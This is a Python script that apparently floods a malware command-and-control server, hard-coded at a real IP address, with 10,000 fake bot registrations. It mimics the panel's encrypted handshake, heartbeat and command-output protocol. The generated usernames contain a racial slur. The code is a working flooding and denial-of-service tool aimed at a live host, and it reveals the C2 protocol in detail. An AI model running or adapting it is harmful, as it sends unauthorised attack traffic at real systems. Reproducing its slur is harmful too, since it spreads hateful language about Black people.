import requests
import json
from cryptography.hazmat.primitives import padding
from chepy import Chepy as c
from colorama import Fore
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import hashlib
import time
import threading
import rsa

# TODO: Format output better 

SERVER_ADDRESS = "http://213.248.43.36:9999"
API_SECRET = "Pt~a[=-#Z8C+Bv:q5WQ*pD"

def encrypt_data_withkey(plaintext, key):
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext.encode('utf-8')) + padder.finalize()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    base64_encoded_ciphertext = base64.b64encode(ciphertext).decode('utf-8')
    return base64_encoded_ciphertext

def decrypt_data_withkey(base64_encoded_ciphertext, key):
    base64_decoded_ciphertext = base64.b64decode(base64_encoded_ciphertext)
    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_ciphertext = decryptor.update(base64_decoded_ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(decrypted_ciphertext) + unpadder.finalize()

    return plaintext

num_clients = 0


client_bytes = secrets.token_bytes(32)

keydata = b'''
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBALs8UksjOtyPspYKUvadwlJUOfoNSqO1hjRNU0k+LeV4MZezErLRWmed
jdNzJi+m7/29S43EjLPMqi0wMTUqoRNFngLnLwsnwIHGzZlpuy0RXJBCYgvd7YlG
OocNAzfS6/7f8E6MRTRONb7BVNBpa+r8u+fPJ8Er/EguQkzVHug/AgMBAAE=
-----END RSA PUBLIC KEY-----
'''

def clientelle():
    time.sleep(random.randint(0, 30))
    global num_clients

    try:

        encrypted_message = encrypt_data_withkey(
            json.dumps({
                "version": 10,
                "uac": True if random.randint(0,1) == 1 else False,
                "username": "nigger" + secrets.token_hex(8),
                "guid": 'windows-guid',
                "cpu": "Intel i5-100k",
                "gpu": "RTX 3050",
                "ram": 16,
                "antivirus": "Windows Defender",
                "path": "C:\\Windows\\System32\\malware.exe",
                "pid": 5102,
                "client_bytes": base64.encodebytes(client_bytes).decode("utf-8"),
            }),
            client_bytes
        ) + "|" + base64.b64encode(rsa.encrypt(client_bytes, rsa.PublicKey.load_pkcs1(keydata))).decode("utf-8")


        register_client = requests.post(
            SERVER_ADDRESS + "/gateway", 
            encrypted_message, 
        )

        decrypted_response = json.loads(
            decrypt_data_withkey(register_client.text, client_bytes).decode("utf-8")
        )
        server_bytes = base64.decodebytes(decrypted_response["server_bytes"].encode())

        new_encryption_key = hashlib.sha256(client_bytes + server_bytes).hexdigest()[:32].encode()
        client_id = decrypted_response["client_id"]

        num_clients += 1
    except Exception as e:
        print("Registration error occured:", e)
        quit(1)
    while True:

        time.sleep(random.randint(270, 300))
        heartbeat_response = requests.post(
            SERVER_ADDRESS + "/gateway", 
            client_id + encrypt_data_withkey(json.dumps({
                "action": "heartbeat",
            }), new_encryption_key), 
        )

        if heartbeat_response.status_code != 200:
            print(heartbeat_response.status_code)


        decrypted_response = decrypt_data_withkey(heartbeat_response.text, new_encryption_key).decode("utf-8")
        if decrypted_response != "Ok":

            try:
                submit_output = requests.post(
                    SERVER_ADDRESS + "/gateway", 
                    client_id + encrypt_data_withkey(json.dumps({
                        "action": "submit_output",
                        "client_id": client_id,
                        "command_id": json.loads(decrypted_response)["command_id"],
                        "output": "Example Output"
                    }), new_encryption_key), 
                )
            except Exception as e:
                print("Submit Output errored:", e)
                pass

            decrypted_response = decrypt_data_withkey(submit_output.text, new_encryption_key).decode("utf-8")
            #print(f"{decrypted_response}\n{'_'*50}")
        
def create_threads(num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=clientelle)
        thread.start()
        threads.append(thread)
    return threads

threads = create_threads(10000)

time.sleep(10)
